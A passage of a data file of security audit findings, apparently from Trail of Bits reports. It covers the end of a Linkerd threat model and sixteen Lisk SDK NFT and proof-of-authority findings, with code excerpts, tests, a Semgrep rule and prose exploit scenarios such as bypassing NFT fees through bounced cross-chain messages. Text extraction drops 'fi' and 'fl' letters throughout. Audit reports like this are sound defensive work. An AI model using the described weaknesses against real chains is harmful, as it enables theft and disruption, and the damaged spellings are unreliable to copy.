searches for guidance on implementing various Linkerd features and nds documentation in blog posts that applies only to Linkerd version 1.x. As a result, he misunderstands Linkerd and its threat model, and he makes conguration mistakes that lead to security issues. Recommendations Short term, on Linkerd blog post pages, add indicators similar to the UI elements used in the Linkerd documentation to clearly indicate which version each guidance page applies to. 45 Linkerd Threat Model", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Informational"]}, {"title": "14. Insu\u0000cient logging of outbound HTTPS calls ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf", "body": "Linkerd operators can use the linkerd-viz extensions such as Prometheus and Grafana to collect metrics for the various proxies in a Linkerd infrastructure. However, these extensions do not collect metrics on outbound calls made by meshed applications. This limits the data that operators could use to conduct incident response procedures if compromised applications reach out to malicious external services and servers. Threat Scenario A meshed application running in the data plane is compromised as a result of a supply chain attack. Because outbound HTTPS calls are not logged, Linkerd operators are unable to collect sucient data to determine the impact of the vulnerability. Recommendations Short term, implement logging for outbound HTTPS connections. A GitHub issue to implement this recommendation already exists in the Linkerd repository but is still unresolved as of this writing. 46 Linkerd Threat Model A. Methodology A threat modeling assessment is intended to provide a detailed analysis of the risks that an application faces at the structural and operational level; the goal is to assess the security of the applications design rather than its implementation details. During these assessments, engineers rely heavily on frequent meetings with the clients developers and on extensive reading of all documentation provided by the client. Code review and dynamic testing are not part of the threat modeling process, although engineers may occasionally consult the codebase or a live instance of the project to verify assumptions about the systems design. Engineers begin a threat modeling assessment by identifying the safeguards and guarantees that are critical to maintaining the target systems condentiality, integrity, and availability. These security controls dictate the assessments overarching scope and are determined by the requirements of the target system, which may relate to technical and reputational concerns, legal liability, and regulatory compliance. With these security controls in mind, engineers then divide the system into logical componentsdiscrete elements that perform specic tasksand establish trust zones around groups of components that lie within a common trust boundary. They identify the types of data handled by the system, enumerating the points at which data is sent, received, or stored by each component, as well as within and across trust boundaries. After establishing a detailed map of the target systems structure and data ows, engineers then identify threat actorsanyone who might threaten the targets security, including both malicious external actors and naive internal actors. Based on each threat actors initial privileges and knowledge, engineers then trace threat actor paths through the system, determining the controls and data that a threat actor might be able to improperly access, as well as the safeguards that prevent such access. Any viable attack path discovered during this process constitutes a nding, which is paired with design recommendations to remediate gaps in the systems defenses. Finally, engineers rate the strength of each security control, indicating the general robustness of that type of defense against the full spectrum of possible attacks. These ratings are provided in the Security Control Maturity Evaluation table. 47 Linkerd Threat Model B. Security Controls and Rating Criteria The following tables describe the security controls and rating criteria used in this report. Security Controls Category", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "1. Impossible to send cross-chain NFT transfers in certain congurations ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-lisksdk-securityreview.pdf", "body": "The isNFTSupported functiona function called in the CrossChainTransferCommands execute function when receiving NFTs from foreign chains to check if an NFT is supportedmay return incorrect results because the getCollectionID function (gure 1.1) enforces that an NFT must be stored before returning the corresponding collection ID. public async getCollectionID( methodContext: ImmutableMethodContext, nftID: Buffer, ): Promise<Buffer> { const nftStore = this.stores.get(NFTStore); const nftExists = await nftStore.has(methodContext, nftID); if (!nftExists) { throw new Error('NFT substore entry does not exist'); } return nftID.slice(LENGTH_CHAIN_ID, LENGTH_CHAIN_ID + LENGTH_COLLECTION_ID); } Figure 1.1: The getCollectionID function (lisk-sdk/framework/src/modules/nft/method.ts#187197) The isNFTSupported function calls getCollectionID if: a) the NFT ID is not native to the chain, b) the SupportedNFTsStore store does not have the ALL_SUPPORTED_NFTS_KEY key, and c) the supportedCollectionIDArray array for the given chain is not empty (indicating that all collections are supported). Under these conditions, isNFTSupported will always throw an exception and prevent the cross chain transfer. Exploit Scenario A developer congures chain A to support NFTs of collection 1 from chain B. A user from chain B attempts to transfer to chain A an NFT belonging to collection 1 of chain B. The cross-chain message (CCM) fails and the NFT cannot be transferred. 18 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment Recommendations Short term, remove the NFT existence check from the getCollectionID function. This will allow obtaining the collection ID of non-stored NFT IDs, which is necessary in the isNFTSupported function. Long term, create tests that cover this case and all other possible congurations of the SupportedNFTsStore store. 19 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "2. NFT module has repeated transfer functionality ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-lisksdk-securityreview.pdf", "body": "The NFT modules transfer command functions, verify and execute, together have the same checks and function calls as the transfer method. Their dierence is in how they handle errors. Having duplicated code, especially for critical functionality such as transferring NFTs, is bad practice, as the code may diverge and lead to exploitable bugs. The same problem exists on the TransferCrossChainCommand command and transferCrossChain method. Exploit Scenario A developer xes a critical vulnerability in one of the functions with copied functionality, but forgets to x the counterpart. The code remains vulnerable. An attacker nds out and steals NFTs from users. Recommendations Short term, factorize the code into a single function that veries if a transfer is valid. The common function should throw custom exceptions based on the type of error that occurred. In both the transfer command and method, have the code call the single function and handle errors appropriately (e.g., by just letting the exception go through, or by catching it and emitting an event). Long term, review other modules for duplicated functionality, especially in critical code paths such as the code that handles transfers. If the code is duplicated, factorize into a single function. 20 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "3. NFT lock method does not check if module is NFT_NOT_LOCKED ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-lisksdk-securityreview.pdf", "body": "The NFT lock method does not check that the module attempting to lock the NFT is not equal to the magic value that represents an unlocked NFT, the NFT_NOT_LOCKED constant (which is equal to nft). It is unlikely that another module is or can be named nft; however, this check should be added to prevent misuse of the lock method. Exploit Scenario Another module that extends or makes use of the NFT module calls the lock method with the module argument set to nft by mistake (e.g., a developer misunderstands the purpose of the module argument). The NFT does not get locked as the developer expected. Recommendations Short term, add a check in the code that ensures that the lock functions module argument is not equal to NFT_NOT_LOCKED. Long term, review stores that use a single state variable to represent more than one state through the use of magic values. In the example described above, the lockingModule state variable is used to determine which module locked the NFT and has a special valueNFT_NOT_LOCKEDto indicate that no module locked it. If possible, we recommend storing the state in two variables, isLocked and lockingModule, to reduce the use of magic values that may lead to state confusion. Do the same decomposition for other stores, where applicable. If these changes are not possible or wanted, ensure that the magic values are always checked when the state is modied. 21 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "4. NFT methods API could be improved ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-lisksdk-securityreview.pdf", "body": "The NFT module performs various checks, such as if an NFT is escrowed or if an NFT is locked in a way that makes the code longer and less readable. Some checks (e.g., NFT existence) also happen more than necessary because of the way the API is designed. To check if an NFT is escrowed to another chain, the code does the check shown in gure 4.1 in several locations. if (owner.length === LENGTH_CHAIN_ID) { Figure 4.1: An if statement that checks if an NFT is escrowed (lisk-sdk/framework/src/modules/nft/commands/transfer.ts#60) This check relies on the fact that the owner eld will have a dierent length if it is storing the address of a native user or the chain ID of a foreign chain. To someone not familiar with the inner workings of the NFT module (e.g., a new employee or a curious user), this is not clear. Instead, the code should call a function named isNFTEscrowed to clarify the purpose of the check being performed. To check if an NFT is locked, the code does the check shown in gure 4.1 in several locations. const lockingModule = await this._method.getLockingModule( context.getMethodContext(), params.nftID, ); if (lockingModule !== NFT_NOT_LOCKED) { Figure 4.2: An if statement that checks if an NFT is locked (lisk-sdk/framework/src/modules/nft/commands/transfer.ts#6875) This check relies on the fact that the lockingModule has a magic value, NFT_NOT_LOCKED, that represents an unlocked NFT. Again, to someone not familiar with the inner workings of the NFT module, it may not be clear why the code is checking the 22 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment lockingModule to see if an NFT is locked. Instead, the code could call a function named isNFTLocked. This would also shorten the codes length. Another problem with the current API is that all NFT methods take an NFT ID argument; as a result, many functions end up performing repeated operations when called in succession. One example of this is the verify function of the TransferCommand command (gure 4.3). public async verify(context: CommandVerifyContext<Params>): Promise<VerificationResult> { const { params } = context; const nftStore = this.stores.get(NFTStore); const nftExists = await nftStore.has(context, params.nftID); if (!nftExists) { throw new Error('NFT substore entry does not exist'); } const owner = await this._method.getNFTOwner(context.getMethodContext(), params.nftID); if (owner.length === LENGTH_CHAIN_ID) { throw new Error('NFT is escrowed to another chain'); } if (!owner.equals(context.transaction.senderAddress)) { throw new Error('Transfer not initiated by the NFT owner'); } const lockingModule = await this._method.getLockingModule( context.getMethodContext(), params.nftID, ); if (lockingModule !== NFT_NOT_LOCKED) { throw new Error('Locked NFTs cannot be transferred'); } return { status: VerifyStatus.OK, }; } Figure 4.3: The verify function of the TransferCommand command (shortened for brevity) (lisk-sdk/framework/src/modules/nft/commands/transfer.ts#4580) The code from gure 4.3 calls the nftStore.has function to check if the NFT exists. Then, the getNFTOwner call internally calls nftStore.has again to check if the NFT exists and it calls nftStore.get to obtain the data of the NFT and extract its owner. Finally, getLockingModule will internally call getNFTOwner (which calls nftStore.has and nftStore.get again). In conclusion, in these three operationschecking the existence of the NFT, getting its owner, and getting its locking modethe existence check is performed three separate times, and the NFT data is obtained two times. 23 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment If the API was designed to receive the NFT data object instead of the NFT ID for most operations (all except checking an NFTs existence and getting the NFT), then this duplication of checks would not occur. In gure 4.4, we suggest an alternative implementation that calls the isNFTEscrowed and isNFTLocked for shorter and cleaner code. This implementation passes to these functions the NFT object instead of the NFT ID to avoid the duplication of checks described above. public async verify(context: CommandVerifyContext<Params>): Promise<VerificationResult> { const { params } = context; const ctx = context.getMethodContext(); const nftData = await this._method.getNFT(ctx, params.nftID); if (!nftData) { throw new Error('NFT substore entry does not exist'); } if (this._method.isNFTEscrowed(ctx, nftData)) { throw new Error('NFT is escrowed to another chain'); } if (!nftData.owner.equals(context.transaction.senderAddress)) { throw new Error('Transfer not initiated by the NFT owner'); } if (this._method.isNFTLocked(ctx, nftData)) { throw new Error('Locked NFTs cannot be transferred'); } return { status: VerifyStatus.OK, }; } Figure 4.4: An alternative example implementation of the verify function of the TransferCommand command Recommendations Short term, create methods to check if an NFT is escrowed and if an NFT is locked. This will improve the codes readability and reduce its size. Furthermore, consider updating most methods of the NFT module to receive the NFT object instead of the NFT ID. This will reduce the amount of time the same check is done in each function. Long term, review other modules where these recommendations may also apply. 24 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "5. Checks done manually instead of using schema validation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-lisksdk-securityreview.pdf", "body": "In two locations in the proof of authority module, checks are done manually when schema validation could be used instead. Using schema validation would result in more robust code. In endpoint.ts, the parameter given to getValidator is checked in the following way: const { address } = context.params; if (typeof address !== 'string') { throw new Error('Parameter address must be a string.'); } cryptoAddress.validateLisk32Address(address); Figure 5.1: Check in getValidator (lisk-sdk/framework/src/modules/poa/endpoint.ts#33-37) However, the following check could be performed instead: validator.validate(getValidatorRequestSchema, address) Figure 5.2: Proposed check for getValidator In commands/update_authority.ts, the length of the commands newValidators list is checked in the following way: if (newValidators.length < 1 || newValidators.length > MAX_NUM_VALIDATORS) { throw new Error( `newValidators length must be between 1 and ${MAX_NUM_VALIDATORS} (inclusive).`, ); } Figure 5.3: Length check in updateAuthority (lisk-sdk/framework/src/modules/poa/commands/update_authority.ts#33-37) 25 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment However, if minItems and maxItems elds were added to the schema for this command (updateAuthoritySchema), this check would be done automatically by the schema validator. Recommendations Short term, add the suggested validator.validate check to endpoint.ts and add the minItems and maxItems elds to the updateAuthoritySchema. Long term, ensure that all Lisk schemas are as expressive as possible. 26 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "6. Update authority command allows validators to have 0 weight ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-lisksdk-securityreview.pdf", "body": "When the proof of authority module initializes its genesis state, it checks that all active validators have nonzero (and positive) weights: // Check that the weight property of every entry in the snapshotSubstore.activeValidators array is a positive integer. if (activeValidators[i].weight <= BigInt(0)) { throw new Error('`activeValidators` weight must be positive integer.'); } Figure 6.1: Validator weight check in genesis initialization (lisk-sdk/framework/src/modules/poa/module.ts#247-250) However, the same check is not made by the update authority command. This means that the current validators could vote to approve a new validator list that includes validators with 0 weight. We could not nd any way that this could be exploited to cause a security problem. However, it would be a good practice to ensure that the invariant for each i, activeValidators[i].weight > 0 always holds. Recommendations Short term, add a check which throws an exception if a validator has 0 weight. Long term, ensure that other expected invariants on weights are ensured. 27 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "7. Incorrect MIN_SINT_32 constant ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-lisksdk-securityreview.pdf", "body": "The MIN_SINT_32 constant, used by Lisks schema validator, is incorrect: its value is -2147483647, but should be -2147483648, since this is the minimum possible 32-bit signed integer. Exploit Scenario A legitimate user tries to use the value -2147483648 in a sint32 eld of a message, but is unable to because the schema validator rejects the message. Recommendations Change the value of the MIN_SINT_32 constant to -2147483648. 28 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "8. Event errors are reverted ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-lisksdk-securityreview.pdf", "body": "The DestroyEvent and the LockEvent classes error methods do not call the BaseEvent classs add method with the noRevert argument set to true. The noRevert argument is used to prevent reverting specic events even when command execution fails; it is useful to emit error events that describe the error that caused the execution failure. Since the DestroyEvent and the LockEvent classes error methods do not pass this argument to the add function, as shown in gures 8.1 and 8.2, and its default value is false, the error eventsemitted when a transaction is about to failwill never be seen by the user. public error(ctx: EventQueuer, data: DestroyEventData, result: NftErrorEventResult): void { this.add(ctx, { ...data, result }, [data.address, data.nftID]); } Figure 8.1: The error method of the DestroyEvent class (lisk-sdk/framework/src/modules/nft/events/destroy.ts#5658) public error(ctx: EventQueuer, data: LockEventData, result: NftErrorEventResult) { this.add(ctx, { ...data, result }, [Buffer.from(data.module), data.nftID]); } Figure 8.2: The error method of the LockEvent class (lisk-sdk/framework/src/modules/nft/events/lock.ts#6365) We found this issue with the Semgrep rule error_event_is_not_revert, which we provided in the rst phase of this audit. rules: - id: error_event_is_not_revert message: An event class has an error function that adds an event that is not persisted. languages: [typescript] severity: WARNING patterns: - pattern-inside: > 29 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment class $CLASS extends BaseEvent { ... } - pattern: > error(...) { ... } - pattern-not: > error(...) { ... this.add(..., true); ... } Figure 8.3: The error_event_is_not_revert Semgrep rule Exploit Scenario 1 An attacker has an attack against a custom side chain that involves brute forcing the destroy method of the NFT module. No error event is emitted for these failures. The attack goes unnoticed. Exploit Scenario 2 A user or blockchain developer tries to destroy an NFT. Their call to the destroy method fails but no error event is emitted. The user fails or takes a very long time to debug the root cause of the failure. Recommendations Short term, on every error method of a subclass of the BaseEvent class (specically for DestroyEvent and LockEvent), pass the noRevert argument set to true. This will ensure that error events are not reverted when commands fail. Long term, to avoid similar errors in the future, integrate the error_event_is_not_revert Semgrep rule, as well as every Semgrep rule that we provided in the rst phase of the audit, into the CI/CD pipeline. Additionally, consider adding an error method to the BaseEvent class that is similar to the add method, but with the noRevert argument defaulting to true. This will make it easier for developers to write code without this buggy pattern. 30 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "9. Unspecied and poorly named NFT endpoints ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-lisksdk-securityreview.pdf", "body": "The getCollectionIDs, collectionExists, and isNFTSupported endpoints of the NFT module exist in the code but are not dened in LIP-0052. Furthermore, the getCollectionIDs and collectionExists functions incorrectly perform a check if an NFT is supported. Instead of using the isNFTSupported method of the NFT module, these functions use the code shown in gure 9.1. const supportedNFTsStore = this.stores.get(SupportedNFTsStore); const chainExists = await supportedNFTsStore.has(ctx, chainID); Figure 9.1: lisk-sdk/framework/src/modules/nft/endpoint.ts#180182 This check does not take into account the existence of the ALL_SUPPORTED_NFTS_KEY key in the SupportedNFTsStore. Also, getCollectionIDs returns the same value if there are no supported collections or if all collections are supported for a given chain. Finally, the functions names are not clear. Given these unclear names and nonexistent specication, we are not entirely sure of the functions intended functionality, but alternative names could be getSupportedCollectionIDs and isCollectionIDSupported. Recommendations Short term, specify the functions described above in the LIP, rename them with a clearer name, and x their functionality accordingly with the developed specication. Long term, create a process to limit adding code to modules without it being specied in a LIP. 31 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "10. The removeSupportAllNFTs function may not remove support for all NFTs ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-lisksdk-securityreview.pdf", "body": "The removeSupportAllNFTs method of the NFT module may not remove support of all NFTs if the ALL_SUPPORTED_NFTS_KEY is present. The removeSupportAllNFTs method (gure 10.1) removes all keys in the SupportedNFTsStore that are returned by the supportedNFTsStore.getAll method (gure 10.2). However, the getAll function will never return the ALL_SUPPORTED_NFTS_KEY key because it iterates over all keys of size LENGTH_CHAIN_ID but ALL_SUPPORTED_NFTS_KEY is the empty string (i.e., does not have a length of LENGTH_CHAIN_ID). public async removeSupportAllNFTs(methodContext: MethodContext): Promise<void> { const supportedNFTsStore = this.stores.get(SupportedNFTsStore); const allSupportedNFTs = await supportedNFTsStore.getAll(methodContext); for (const { key } of allSupportedNFTs) { await supportedNFTsStore.del(methodContext, key); } this.events.get(AllNFTsSupportRemovedEvent).log(methodContext); } Figure 10.1: lisk-sdk/framework/src/modules/nft/method.ts#709719 public async getAll( context: ImmutableStoreGetter, ): Promise<{ key: Buffer; value: SupportedNFTsStoreData }[]> { return this.iterate(context, { gte: Buffer.alloc(LENGTH_CHAIN_ID, 0), lte: Buffer.alloc(LENGTH_CHAIN_ID, 255), }); } Figure 10.2: lisk-sdk/framework/src/modules/nft/stores/supported_nfts.ts#6370 We used the test from gure 10.3 to conrm the issue described above. it('should remove all existing entries even if the ALL_SUPPORTED_NFTS_KEY 32 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment entry exists', async () => { await supportedNFTsStore.save(methodContext, ALL_SUPPORTED_NFTS_KEY, { supportedCollectionIDArray: [], }); await expect(method.removeSupportAllNFTs(methodContext)).resolves.toBeUndefined(); await expect(supportedNFTsStore.has(methodContext, ALL_SUPPORTED_NFTS_KEY)).resolves.toBeFalse(); checkEventResult(methodContext.eventQueue, 1, AllNFTsSupportRemovedEvent, 0, {}, null); }); Figure 10.3: Test that fails because the removeSupportAllNFTs does not delete the ALL_SUPPORTED_NFTS_KEY key. Highlighted in red is the check that fails. Exploit Scenario A module relies on the removeSupportAllNFTs function for removing support for all NFTs under specic conditions. The call to removeSupportAllNFTs fails to remove support for all NFTs. An attacker exploits this fact to break the modules assumptions and exploit the sidechain. Recommendations Short term, in the removeSupportAllNFTs function, also remove the ALL_SUPPORTED_NFTS_KEY key. Add the test in gure 10.3 to the existing test suite. Long term, write more complex tests for removeSupportAllNFTs and similar functions. Edge cases and magic values such as ALL_SUPPORTED_NFTS_KEY should be thoroughly tested. 33 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "11. Bug in removeSupportAllNFTs tests ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-lisksdk-securityreview.pdf", "body": "The test for the removeSupportAllNFTs function incorrectly saves a random wrong value to the supportedNFTsStore store. The test should work by: 1) creating a random chainID, 2) saving that chainID to the supportedNFTsStore store, 3) removing the support for that chainID, and 4) checking that the supportedNFTsStore no longer contains the chainID key. The bug is in step 2, where the code is just saving a random chain ID instead of using the chainID variable (highlighted in red in gure 11.1). const chainID = utils.getRandomBytes(LENGTH_CHAIN_ID); await supportedNFTsStore.save(methodContext, utils.getRandomBytes(LENGTH_CHAIN_ID), { supportedCollectionIDArray: [], }); await expect(method.removeSupportAllNFTs(methodContext)).resolves.toBeUndefined(); await expect(supportedNFTsStore.has(methodContext, chainID)).resolves.toBeFalse(); Figure 11.1: lisk-sdk/framework/test/unit/modules/nft/method.spec.ts#11831191 Furthermore, by removing the call to supportedNFTsStore.save altogether, the test still passes, which is undesirable. The code should rst check that the NFT is supported, remove support for all NFTs, and check if the NFT is no longer supported. Recommendations Short term, x the test described above by replacing the call to supportedNFTsStore.saves utils.getRandomBytes(LENGTH_CHAIN_ID) argument with the chainID variable. Also, add a check in the test that ensures that the NFT is supported before removing it. Long term, use a tool such as necessist to nd other issues in tests. 34 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "12. Bounced NFT transfers may cause events to contain incorrect data ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-lisksdk-securityreview.pdf", "body": "When an error occurs on a cross-chain NFT transfer and the status of the CCM is not CCM_STATUS_CODE_OK, the recipientAddress variable is set to the value of the senderAddress variable in two locations: here and here. The senderAddress variable is not updated. Then, at the end of the function, a CcmTransferEvent event is emitted with the senderAddress and recipientAddress values (gure 12.1), which, as explained above, will always have the same value on status dierent from CCM_STATUS_CODE_OK. The same problem exists in the token module. this.events.get(CcmTransferEvent).log(context, { senderAddress, recipientAddress, nftID, }); Figure 12.1: lisk-sdk/framework/src/modules/nft/cc_commands/cc_transfer.ts#157161 Another problem is the lack of sending and receiving chainID data in the event. While the token module includes the receiving chainID, the NFT module includes neither (as shown in gure 12.1). Exploit Scenario A developer is tracing where an NFT was transferred to and from to audit an ongoing attack. In the logs, the developer sees that the NFT was transferred from account A to account B and then, because an error occurred, the log will show a transfer from account A to account A. In both cases, the receiving and sending chainIDs are not included in the event data. This confuses the developer and slows down the auditing process. Recommendations Short term, in both the NFT and token modules CcmTransferEvent event, update the senderAddress to correctly show the sender address of the NFT or token amount. Consider if the event data should also include the sending and receiving chainIDs, and 35 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment update both modules accordingly. This will make the CcmTransferEvent events emitted by the NFT and Token modules more expressive and consistent with each other. Long term, review the events emitted in all other commands. Ensure that they are consistent with similar commands and that they are sucient to trace the ownership of assets and other required properties. 36 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "13. An NFT's attributesArray can have duplicate modules ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-lisksdk-securityreview.pdf", "body": "The NFT module denes the createNFTEntry function, which is responsible for creating a new NFT and ensuring that the NFTs attributesArray array does not have duplicate modules, as highlighted in gure 13.1. public async createNFTEntry( methodContext: MethodContext, address: Buffer, nftID: Buffer, attributesArray: NFTAttributes[], ): Promise<void> { const moduleNames = []; for (const item of attributesArray) { moduleNames.push(item.module); } if (new Set(moduleNames).size !== attributesArray.length) { throw new Error('Invalid attributes array provided'); } const nftStore = this.stores.get(NFTStore); await nftStore.save(methodContext, nftID, { owner: address, attributesArray, }); } Figure 13.1: lisk-sdk/framework/src/modules/nft/internal_method.ts#6383 The createNFTEntry function is never called; instead, the nftStore.save method is called directly in many locations. In some locations, such as in the create method, the attributeArray uniqueness check is copy-pasted, while in others this uniqueness property is not enforced. In particular, two places may result in the NFT having duplicate module attributes:  When a foreign NFT is received (lisk-sdk/framework/src/modules/nft/cc_commands/cc_transfer.ts#L142-L145) 37 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment  When a foreign NFT is bounced (lisk-sdk/framework/src/modules/nft/cc_commands/cc_transfer.ts#L149-L152) In the recover function and cross-chain transfers to the NFTs native chain, this problem also exists but is not exploitable because the incoming NFT attributes are dropped by the current implementation of getNewAttributes:  lisk-sdk/framework/src/modules/nft/cc_commands/cc_transfer.ts#L116  lisk-sdk/framework/src/modules/nft/method.ts#L977 The createUserEntry function is also not used here and here, and the createEscrowEntry function is not used here. Exploit Scenario An attacker sends an NFT with duplicate attributes from chain A (the NFTs native chain) to chain B. A custom module of chain B performs validation of the NFTs attributes by iterating over the attributes array until it nds the rst instance corresponding to module X (e.g., using the arrays find method) and then doing the check. Later, the same custom module gets the attributes for module X in a dierent way that returns the last instance on the attributes array instead of the rst (e.g., by iterating over the whole array and adding the values to a map for faster access). Only the rst instance is checked, breaking the guarantees that the module has for the attributes and potentially leading to a security problem. Recommendations Short term, in every location where an NFT is created or updated, use a purposely built function (e.g., the createNFTEntry function) to create the NFT and ensure the correctness of its properties. Avoid calling nftStore.save and similar methods in other code locations. Long term, in general, avoid modifying the stores state directly, especially when specic properties need to be enforced. Instead, create purposely built functions that enforce the properties in a single centralized location that is easy to audit and avoids code repetition. See gure 4.4 from nding TOB-LISK2-4 to see what the nal result could look like. 38 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "14. Bounced messages may be abused to bypass NFT fees ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-lisksdk-securityreview.pdf", "body": "On CCMs with a status dierent from CCM_STATUS_CODE_OK (gure 14.1 highlighted in yellow), the NFT creation does not incur a fee. if (status === CCM_STATUS_CODE_OK) { this._feeMethod.payFee(getMethodContext(), BigInt(FEE_CREATE_NFT)); await nftStore.save(getMethodContext(), nftID, { owner: recipientAddress, attributesArray: receivedAttributes as NFTAttributes[], }); await this._internalMethod.createUserEntry(ctx, recipientAddress, nftID); } else { recipientAddress = senderAddress; await nftStore.save(getMethodContext(), nftID, { owner: recipientAddress, attributesArray: receivedAttributes as NFTAttributes[], }); await this._internalMethod.createUserEntry(ctx, recipientAddress, nftID); } Figure 14.1: lisk-sdk/framework/src/modules/nft/cc_commands/cc_transfer.ts#140154 This code works this way because messages with a status dierent from CCM_STATUS_CODE_OK are expected to be a bounced CCM, i.e., a CCM where the NFT is being recreated after a previous cross-chain transfer failed. However, there is nothing preventing a malicious sidechain from initiating a CCM with any status, enabling them to transfer NFTs cross-chain without paying the fee. Exploit Scenario Chain A sends an NFT (native to Chain A) to chain B, setting the message status to a value dierent from CCM_STATUS_CODE_OK (e.g., CCMStatusCode.MODULE_NOT_SUPPORTED). Chain B receives the foreign NFT and creates the NFT entry without the fee payment. 39 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment Recommendations Short term, enforce a fee payment even on bounced messages. If this is not possible or wanted, modify the interoperability module to guarantee that the mainchain enforces that bounced messages cannot be initiated by malicious side chains. Long term, review other modules handling of bounced messages to ensure similar problems do not exist. 40 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "15. NFT recover function may crash ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-lisksdk-securityreview.pdf", "body": "The recover function of the NFT module does not verify that the NFT to be recovered exists in its NFTStore. This causes the nftStore.get call highlighted in gure 15.1 to crash. const nftData = await nftStore.get(methodContext, nftID); if (!nftData.owner.equals(terminatedChainID)) { Figure 15.1: lisk-sdk/framework/src/modules/nft/method.ts#940941 Exploit Scenario A malicious sidechain sends a fake recovered NFT that does not exist on its native chain. The native chains recover function crashes. Recommendations Short term, add a check to ensure that the NFT exists before accessing its data. This will ensure the recover function throws an exception explicitly instead of crashing unexpectedly. Long term, write fuzzing harnesses that send arbitrary objects (that are valid according to given schema) to the recover method to simulate the behavior of malicious sidechains. 41 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Medium"]}, {"title": "16. NFT recover function does properly validate NFT attributes array ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-lisksdk-securityreview.pdf", "body": "The recover function of the NFT module does not call validator.validate on the storeValue variable after decoding the value (gure 16.1). try { decodedValue = codec.decode<NFTStoreData>(nftStoreSchema, storeValue); } catch (error) { isDecodable = false; } Figure 16.1: lisk-sdk/framework/src/modules/nft/method.ts#902908 As such, the NFT attributes module names are not validated for length or pattern with the nftStoreSchema, which is shown in gure 16.2. export const nftStoreSchema = { $id: '/nft/store/nft', type: 'object', required: ['owner', 'attributesArray'], properties: { owner: { dataType: 'bytes', fieldNumber: 1, }, attributesArray: { type: 'array', fieldNumber: 2, items: { type: 'object', required: ['module', 'attributes'], properties: { module: { dataType: 'string', minLength: MIN_LENGTH_MODULE_NAME, maxLength: MAX_LENGTH_MODULE_NAME, pattern: '^[a-zA-Z0-9]*$', fieldNumber: 1, }, 42 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment attributes: { dataType: 'bytes', fieldNumber: 2, }, }, }, }, }, }; Figure 16.2: lisk-sdk/framework/src/modules/nft/stores/nft.ts#2859 The following test can be used to conrm that the call to codec.decode does not validate a strings length. describe('length_validation', () => { const schema_with_max_length = { $id: '/lisk/decode/with_max_length', type: 'object', properties: { foo: { dataType: 'string', fieldNumber: 1, minLength: 2, maxLength: 2, }, }, }; it('should work with a valid length of 2', () => { const res = codec.encode(schema_with_max_length, {foo: \"12\"}); expect(codec.decode(schema_with_max_length, res)).toEqual({foo: \"12\"}); }); it('should not work with length different than 2', () => { const res = codec.encode(schema_with_max_length, {foo: \"12345\"}); expect(codec.decode(schema_with_max_length, res)).toThrow(); // This does not throw }); }); Figure 16.3: Test that conrms that calls to codec.decode do not validate a strings length This nding is informational because the attributes are not used unless a custom module implements the getNewAttributes function. Exploit Scenario An attacker recovers an NFT from a chain they own to a sidechain that reimplements the getNewAttributes function to use the received NFT 